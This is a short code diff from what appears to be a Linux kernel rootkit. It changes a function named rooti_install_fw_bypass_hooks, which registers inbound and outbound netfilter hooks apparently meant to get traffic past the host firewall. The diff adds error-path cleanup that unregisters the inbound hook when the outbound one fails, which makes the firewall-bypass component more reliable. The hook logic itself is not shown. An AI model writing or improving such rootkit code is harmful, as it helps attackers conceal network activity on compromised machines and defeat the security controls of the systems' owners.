@@ -48,16 +48,21 @@ int rooti_install_fw_bypass_hooks(void)
     err = nf_register_net_hook(&init_net, &rooti_inbound_nf_hook);
     if (err) {
         ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
-        return err;
+        goto error_install_inbound;
     }
 
     err = nf_register_net_hook(&init_net, &rooti_outbound_nf_hook);
     if (err) {
         ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
-        return err;
+        goto error_install_outbound;
     }
 
     return 0;
+
+error_install_outbound:
+    nf_unregister_net_hook(&init_net, &rooti_inbound_nf_hook);
+error_install_inbound:
+    return err;
 }
 
 void rooti_uninstall_fw_bypass_hooks(void)
